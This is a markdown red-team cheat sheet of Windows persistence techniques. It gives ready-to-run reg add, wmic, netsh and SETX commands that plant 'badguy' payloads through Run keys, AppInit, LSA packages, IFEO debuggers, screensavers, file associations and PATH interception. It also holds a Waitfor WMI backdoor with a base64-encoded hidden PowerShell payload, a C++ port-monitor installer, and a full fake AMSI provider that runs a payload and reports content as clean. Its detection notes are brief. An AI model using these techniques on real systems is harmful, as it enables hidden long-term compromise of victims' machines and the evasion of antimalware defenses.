# Windows persistence addons

</br>

* [Non admin](#Non-admin)
	* [Malicious dll](#Add-malicious-dll-file-in-reg)
	* [DLL Search Order Hijacking](#DLL-Search-Order-Hijacking)
	* [Screensaver](#Screensaver)
	* [Shortcut Modification](#Shortcut-Modification)
	* [Waitfor](#Waitfor)
* [Admin](#Admin)
	* [Debugger](#Debugger)
	* [WMI](#Using-WMI-Windows-Management-Instrumentation)
	* [AppInit](#AppInit)
	* [Lsass](#System-process-Lsass)
	* [Netsh](#Netsh)
	* [AppCert DLLs](#AppCert-DLLs)
	* [Authentification Packages](#Authentification-Packages)
	* [Change default file association](#Change-default-file-association)
	* [Path Interception](#Path-Interception)
	* [Port Monitors](#Port-Monitors)
	* [Time providers](#Time-providers)
	* [AMSI](#AMSI-Antimalware-Scan-Interface)
	* [COM Hijacking](#COM-Hijacking)



</br>

# Non admin
</br>

##  Add malicious dll file in reg

#### Example(Microsoft office):
```powershell
reg add "HKCU\Software\OfficeMicrosoft\ test\Special\Perf" /t REG_SZ /d C:\path\to\badguy.dll
```
Every time when user starts a new session in Microsoft office apps,  your payload will be executed.

#### Detection:
User can see malicious string in reg **HKCU**

</br></br>

## DLL Search Order Hijacking

Some programs search for necessary **.dll** files in their local directory. You can simply change this **dll's** to yours. (If program runs with admin or system privileges, your dll will also have that privileges)

#### Detection:
User can see malicious dll inside program folders.

</br></br>

## Screensaver
Screensavers are part of Windows functionality and let users to display a screen message or a graphic animation after some period of inactivity. This feature of Windows is known to be abused by threat actors as a method of persistence. This is because screensavers are executable files that have the **.scr** file extension and are executed via the scrnsave.scr utility.

Since the **.scr** files are essentially executables both extensions can be used to the file that will act as an implant.

*refer: https://pentestlab.blog/2019/10/09/persistence-screensaver/*

#### Example (exe):
To enable screen saver:

```powershell
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d "1"
```

To enable password for the screen saver:
```powershell
reg add "HKCU\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d "1"
```
 
 To change timeout for activating the screen saver:
```powershell
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "60"
```

To add your binary for screen saver:
```powershell
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\path\to\badguy.exe"
```

#### Detection:
User can see malicious strings in reg **HKCU**

</br></br>

## Shortcut Modification
You can change shortcut properties for stealth command execution. For example modify target shortcut to run this command:
```powershell
powershell.exe -c "powershell.exe -w hidden  C:\path\to\badguy.exe ; C:\path\to\shortcut_program.exe"

```
When user clicks this shortcut, system will start **badguy.exe** and **shortcut_program.exe ** simultaneously

#### Detection:
In process manager user can see malicious process.

</br></br>

## Waitfor

Waitfor is a Microsoft binary which is typically used to synchronize computers across a network by sending signals.  The binary is stored in *C:\Windows\System32* folder. Both hosts (sender and receiver) need to be on the same network segment.

```powershell
waitfor badguy && C:\path\to\badguy.exe;
```

You can run this command in endless loop, or using Task Scheduler, or use this PowerShell [script](https://github.com/3gstudent/Waitfor-Persistence) which stores the command in a **WMI** class to enable the wait mode continuously..
#### Example:

```powershell
<#
    A quick POC to use Waitfor.exe to maintain persistence
    Author: 3gstudent @3gstudent
    Learn from:https://twitter.com/danielhbohannon/status/872258924078092288
#>
$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
$StaticClass.Name = 'Win32_Backdoor'
$StaticClass.Put()| Out-Null
$StaticClass.Properties.Add('Code' , "cmd /c start C:\path\to\badguy.exe ```&```& taskkill /f /im powershell.exe ```&```& waitfor badguy ```&```& powershell -nop -W Hidden -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==")
$StaticClass.Put() | Out-Null
 
$exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value;
iex $exec | Out-Null
```
***ADMIN PRIBILEGES NEEDED!!!***
- Once the module is imported it will execute the “_waitfor_” command.
	```powershell
		Import-Module .\Your_Waitfor-Persistence_script.ps1
	```

- Or you can add *Your_Waitfor-Persistence_script.ps1* in *C:\Windows\System32\WindowsPowerShell\v1.0* 
   And with every powershell launch this module will be started too
  ```powershell 
	copy Your_Waitfor-Persistence_script.ps1 C:\Windows\System32\WindowsPowerShell\v1.0\Your_Waitfor-Persistence_script_.ps1
  ```
Also, for this method you need to set **ExecutionPolicy**
  ```powershell
Set-ExecutionPolicy Unrestricted
  ```

Now, with command 
```powershell
waitfor /s target_ip /si badguy
```

You will send a signal to target_macheine, and your **badguy.exe** will be executed.
(You need to be in **LAN** with *target_machine*)

*refer: https://pentestlab.blog/2020/02/04/persistence-waitfor/*

#### Detection:
User can see imported modules by executing

```powershell
write-host "$PSModulePath"
```

</br></br>

# Admin

</br>

## Debugger


#### Example:

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t reg_sz /d "cmd /C C:\Windows\System32\calc.exe & c:\path\to\badguy.exe" /f
```

Add command in **HKLM** reg,  that will execute your **badguy.exe**  

#### Detection:
User can see malicious string in reg **HKLM**


</br></br>

## Using WMI (Windows Management Instrumentation)

Windows Management Instrumentation (WMI) enables system administrators to perform tasks locally and remotely.

Typically persistence via WMI event subscription requires creation of the following three classes which are used to store the payload or the arbitrary command, to specify the event that will trigger the payload and to relate the two classes (__EventConsumer &__EventFilter) so execution and trigger to bind together.

-   **__EventFilter** // Trigger (new process, failed logon etc.)
-   **EventConsumer** // Perform Action (execute payload etc.)
-   **__FilterToConsumerBinding** // Binds Filter and Consumer Classes

#### Example:
Execution of the following commands will create three events in the _“**root\subscription**“_ namespace. The arbitrary payload will be executed within 60 seconds every time Windows starts.
```powershell
 wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="PentestLab", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
 wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="PentestLab", ExecutablePath="C:\Windows\System32\pentestlab.exe",CommandLineTemplate="C:\Windows\System32\pentestlab.exe"
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"PentestLab\"", Consumer="CommandLineEventConsumer.Name=\"PentestLab\""
```

Add new event to database and set the execution timer.


#### Detection:

User can see malicious string in *WMI Database Enties*

</br></br>

## AppInit

#### Example:
##### For x64 programs:
```powershell
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f

reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "c:\path\to\badguy64.dll" /f

```

##### For x32 programs:
```powershell
reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f

reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "c:\path\to\badguy32.dll" /f
```

Turn LoadAppInit_DLLs to 1 and add in AppInit_DLLs path to malware.

#### Detection:

User can see that value of **LoadAppInit_DLLs** at *HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows* or  *HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows* is set to 1 and also can see malicious string at the same path in  **AppInit_DLLs**.


</br></br>

## System process Lsass

#### Example:
```powershell
reg add "HKLM\system\currentcontrolset\control\lsa" /v "Notification Packages" /t reg_multi_sz /d "c:\path\to\badguy.dll" /f

```
Just add a library for *Lsass* process

#### Detection:
User can see malicious string in reg **HKLM**

</br></br>
	
## Netsh

#### Example:
```powershell
 cmd> c:\windows\syswow64\netsh.exe

 netsh> add helper c:\path\to\badguy32.dll

 cmd> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v persistence /t REG_SZ /d "C:\Windows\SysWOW64\netsh.exe"
```
add dll helpper module to netsh than add netsh to autorun

#### Detection:
User will see *Netsh* program in autorun (but it's hard to see **badguy32.dll**)

</br></br>

## AppCert DLLs

   #### Example:
```powershell
reg add "HKLM\System\CurrentControlSet\Control\Session Manager" /v AppCertDLLs /t REG_SZ /d "C:\path\to\badguy.dll"

```
*badguy.dll* loads when Windows uses Api functions like: *CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, WinExec*.



#### Detection:
User can see malicious string in reg **HKLM**

</br></br>

## Authentification Packages

#### Example:
```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Authentication Packages" /v persistence /t REG_SZ /d "C:\path\to\badguy.exe"

```

*badguy.exe* executes when system loads packets **Authentication Pack** on system startup
#### Detection:
User can see malicious string in reg **HKLM**

</br></br>

## Change default file association 

*refer: https://pentestlab.blog/2020/01/06/persistence-change-default-file-association/*

#### Example (txt,simple way):
```powershell
reg add "HKEY_CLASSES_ROOT\textfile\shell\open\command" /v (Default) /t REG_SZ /d "C:\path\to\badguy.exe"
```

*badguy.exe* executes when user opens file with **.txt** extension
#### Detection:
User can see malicious string in reg **HKCR**

</br></br>

## Path Interception
If some path is set, for example, before *c:\Windows\System32*  it means that all common programs inside *System32* first will be searched in other directories.
You can change **Path** variable to insert your "malicious" directory with programs, with names identical to programs inside *System32*. When this com	mands executes, your programs runs.

#### Example:
```powershell
SETX /M PATH "C:\badguy;%PATH%"

```
Programs ran by their names (e.g. from terminal) will be executed from *badguy* folder if they exist in it.


#### Detection:
User can see **PATH** variable

</br></br>

## Port Monitors
The Print Spooler service is responsible for managing printing jobs in OS Windows. Interaction with the service is performed through the Print Spooler API which contains a function (**AddMonitor**) that can be used to install local port monitors and connect the configuration, data and monitor files. This function has the ability to inject a DLL into the **spoolsv.exe** process and by creating a registry key red team operators can achieve persistence on the system. 

*refers:* 
* https://pentestlab.blog/2019/10/28/persistence-port-monitors/
* https://www.ired.team/offensive-security/persistence/t1013-addmonitor#execution


#### Example:
compile this cpp file, where *badguy.dll* your payload
```C++
#include "stdafx.h"
#include "Windows.h"

int main() {	
	MONITOR_INFO_2 monitorInfo;
	TCHAR env[12] = TEXT("Windows x64");
	TCHAR name[12] = TEXT("evilMonitor");
	TCHAR dll[12] = TEXT("badguy.dll");
	monitorInfo.pName = name;
	monitorInfo.pEnvironment = env;
	monitorInfo.pDLLName = dll;
	AddMonitor(NULL, 2, (LPBYTE)&monitorInfo);
	return 0;
}
```

Move **badguy.dll** and your compiled binary to *%systemroot%* folder

```powershell
copy C:\path\to\badguy.dll %systemroot%
copy C:\path\to\your_binary.exe %systemroot%
```
Start your binary.

Add your dll to registry
```powershell
reg add "hklm\system\currentcontrolset\control\print\monitors\persistence" /v "Driver" /d "badguy.dll" /t REG_SZ
```
With every system startup the *spoolsv.exe* process will load all the driver DLL files that exist in the Monitors registry key and stored in System32 folder.

#### Detection:

User can see malicious string in reg **HKLM**

</br></br>

## Time providers

 Time providers are implemented in the form of a DLL file which resides in System32 folder. The service **W32Time** initiates during the startup of Windows and loads the w32time.dll. Since the associated service is starting automatically during Windows startup, it can be used as a persistence mechanism.
 
 
```powershell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient" /v DllName /t REG_SZ /d "C:\path\to\badguy.dll"
```

Add *badguy.dll* to *W32Time* Timeprovider service. NtpClient starts with system for time synsynchronization and will execute your *dll*.

*refer: https://pentestlab.blog/2019/10/22/persistence-time-providers/*

#### Detection:

User can see malicious **dll** in reg of **W32Time**

</br></br>

## AMSI (Antimalware Scan Interface)

The following code represents the fake AMSI provider which upon execution of the trigger will open *badguy.exe*

```C++
#include "stdafx.h"
#include <process.h>
#include <subauth.h>
#include <strsafe.h>
#include <amsi.h>
#include <windows.h>
#include <wrl/module.h>

using namespace Microsoft::WRL;

HMODULE g_currentModule;

typedef void (NTAPI* _RtlInitUnicodeString)(
	PUNICODE_STRING DestinationString,
	PCWSTR SourceString
	);

typedef NTSYSAPI BOOLEAN(NTAPI* _RtlEqualUnicodeString)(
	PUNICODE_STRING String1,
	PUNICODE_STRING String2,
	BOOLEAN CaseInsetive
	);

DWORD WINAPI MyThreadFunction(LPVOID lpParam);
void ErrorHandler(LPTSTR lpszFunction);

BOOL APIENTRY DllMain(HMODULE module, DWORD reason, LPVOID reserved)
{
	switch (reason)
	{
	case DLL_PROCESS_ATTACH:
		g_currentModule = module;
		DisableThreadLibraryCalls(module);
		Module<InProc>::GetModule().Create();
		break;

	case DLL_PROCESS_DETACH:
		Module<InProc>::GetModule().Terminate();
		break;
	}
	return TRUE;
}

#pragma region COM server boilerplate
HRESULT WINAPI DllCanUnloadNow()
{
	return Module<InProc>::GetModule().Terminate() ? S_OK : S_FALSE;
}

STDAPI DllGetClassObject(_In_ REFCLSID rclsid, _In_ REFIID riid, _Outptr_ LPVOID FAR* ppv)
{
	return Module<InProc>::GetModule().GetClassObject(rclsid, riid, ppv);
}
#pragma endregion

class
	DECLSPEC_UUID("2E5D8A62-77F9-4F7B-A90C-2744820139B2")
	BadguyAmsiProvider : public RuntimeClass<RuntimeClassFlags<ClassicCom>, IAntimalwareProvider, FtmBase>
{
public:
	IFACEMETHOD(Scan)(_In_ IAmsiStream * stream, _Out_ AMSI_RESULT * result) override;
	IFACEMETHOD_(void, CloseSession)(_In_ ULONGLONG session) override;
	IFACEMETHOD(DisplayName)(_Outptr_ LPWSTR * displayName) override;

private:
	LONG m_requestNumber = 0;
};


HRESULT BadguyAmsiProvider::Scan(_In_ IAmsiStream* stream, _Out_ AMSI_RESULT* result)
{
	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
	_RtlEqualUnicodeString RtlEqualUnicodeString = (_RtlEqualUnicodeString)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlEqualUnicodeString");

	UNICODE_STRING myTriggerString1;
	RtlInitUnicodeString(&myTriggerString1, L"badguy");

	UNICODE_STRING myTriggerString2;
	RtlInitUnicodeString(&myTriggerString2, L"\"badguy\"");

	UNICODE_STRING myTriggerString3;
	RtlInitUnicodeString(&myTriggerString3, L"'badguy'");

	ULONG actualSize;
	ULONGLONG contentSize;
	if (!SUCCEEDED(stream->GetAttribute(AMSI_ATTRIBUTE_CONTENT_SIZE, sizeof(ULONGLONG), reinterpret_cast<PBYTE>(&contentSize), &actualSize)) &&
		actualSize == sizeof(ULONGLONG))
	{
		*result = AMSI_RESULT_NOT_DETECTED;

		return S_OK;
	}

	PBYTE contentAddress;
	if (!SUCCEEDED(stream->GetAttribute(AMSI_ATTRIBUTE_CONTENT_ADDRESS, sizeof(PBYTE), reinterpret_cast<PBYTE>(&contentAddress), &actualSize)) &&
		actualSize == sizeof(PBYTE))
	{
		*result = AMSI_RESULT_NOT_DETECTED;

		return S_OK;
	}


	if (contentAddress)
	{
		if (contentSize < 50)
		{
			UNICODE_STRING myuni;
			myuni.Buffer = (PWSTR)contentAddress;
			myuni.Length = (USHORT)contentSize;
			myuni.MaximumLength = (USHORT)contentSize;

			if (RtlEqualUnicodeString(&myTriggerString1, &myuni, TRUE) || RtlEqualUnicodeString(&myTriggerString2, &myuni, TRUE) || RtlEqualUnicodeString(&myTriggerString3, &myuni, TRUE))
			{

				DWORD thId;
				CreateThread(NULL, 0, MyThreadFunction, NULL, 0, &thId);
			}
		}
	}

	*result = AMSI_RESULT_NOT_DETECTED;

	return S_OK;
}

void BadguyAmsiProvider::CloseSession(_In_ ULONGLONG session)
{

}

HRESULT BadguyAmsiProvider::DisplayName(_Outptr_ LPWSTR* displayName)
{
	*displayName = const_cast<LPWSTR>(L"Sample AMSI Provider");
	return S_OK;
}

CoCreatableClass(BadguyAmsiProvider);

DWORD WINAPI MyThreadFunction(LPVOID lpParam)
{
	system("c:\\path\\to\\badguy.exe");

	return 0;
}


#pragma region Install / uninstall

HRESULT SetKeyStringValue(_In_ HKEY key, _In_opt_ PCWSTR subkey, _In_opt_ PCWSTR valueName, _In_ PCWSTR stringValue)
{
	LONG status = RegSetKeyValue(key, subkey, valueName, REG_SZ, stringValue, (wcslen(stringValue) + 1) * sizeof(wchar_t));
	return HRESULT_FROM_WIN32(status);
}

STDAPI DllRegisterServer()
{
	wchar_t modulePath[MAX_PATH];
	if (GetModuleFileName(g_currentModule, modulePath, ARRAYSIZE(modulePath)) >= ARRAYSIZE(modulePath))
	{
		return E_UNEXPECTED;
	}

	wchar_t clsidString[40];
	if (StringFromGUID2(__uuidof(BadguyAmsiProvider), clsidString, ARRAYSIZE(clsidString)) == 0)
	{
		return E_UNEXPECTED;
	}

	wchar_t keyPath[200];
	HRESULT hr = StringCchPrintf(keyPath, ARRAYSIZE(keyPath), L"Software\\Classes\\CLSID\\%ls", clsidString);
	if (FAILED(hr)) return hr;

	hr = SetKeyStringValue(HKEY_LOCAL_MACHINE, keyPath, nullptr, L"BadguyAmsiProvider");
	if (FAILED(hr)) return hr;

	hr = StringCchPrintf(keyPath, ARRAYSIZE(keyPath), L"Software\\Classes\\CLSID\\%ls\\InProcServer32", clsidString);
	if (FAILED(hr)) return hr;

	hr = SetKeyStringValue(HKEY_LOCAL_MACHINE, keyPath, nullptr, modulePath);
	if (FAILED(hr)) return hr;

	hr = SetKeyStringValue(HKEY_LOCAL_MACHINE, keyPath, L"ThreadingModel", L"Both");
	if (FAILED(hr)) return hr;

	// Register this CLSID as an anti-malware provider.
	hr = StringCchPrintf(keyPath, ARRAYSIZE(keyPath), L"Software\\Microsoft\\AMSI\\Providers\\%ls", clsidString);
	if (FAILED(hr)) return hr;

	hr = SetKeyStringValue(HKEY_LOCAL_MACHINE, keyPath, nullptr, L"BadguyAmsiProvider");
	if (FAILED(hr)) return hr;

	return S_OK;
}

STDAPI DllUnregisterServer()
{
	wchar_t clsidString[40];
	if (StringFromGUID2(__uuidof(BadguyAmsiProvider), clsidString, ARRAYSIZE(clsidString)) == 0)
	{
		return E_UNEXPECTED;
	}

	// Unregister this CLSID as an anti-malware provider.
	wchar_t keyPath[200];
	HRESULT hr = StringCchPrintf(keyPath, ARRAYSIZE(keyPath), L"Software\\Microsoft\\AMSI\\Providers\\%ls", clsidString);
	if (FAILED(hr)) return hr;
	LONG status = RegDeleteTree(HKEY_LOCAL_MACHINE, keyPath);
	if (status != NO_ERROR && status != ERROR_PATH_NOT_FOUND) return HRESULT_FROM_WIN32(status);

	// Unregister this CLSID as a COM server.
	hr = StringCchPrintf(keyPath, ARRAYSIZE(keyPath), L"Software\\Classes\\CLSID\\%ls", clsidString);
	if (FAILED(hr)) return hr;
	status = RegDeleteTree(HKEY_LOCAL_MACHINE, keyPath);
	if (status != NO_ERROR && status != ERROR_PATH_NOT_FOUND) return HRESULT_FROM_WIN32(status);

	return S_OK;
}
#pragma endregion
```


Compile this C++ code to **your_compiled_ AMSI_provider.dll**
The AMSI Provider can be registered in the system with the *regsvr32* utility.
```powershell
regsvr32 your_compiled_ AMSI_provider.dll

```
When the keyword(**badguy** in our case) is passed to a PowerShell console, our payload will be executed.

*refer: https://pentestlab.blog/2021/05/17/persistence-amsi/*

#### Detection:

User can see strange AMSI Provider in reg.

</br></br>

##  COM Hijacking


*refer: https://pentestlab.blog/2020/05/20/persistence-com-hijacking/*





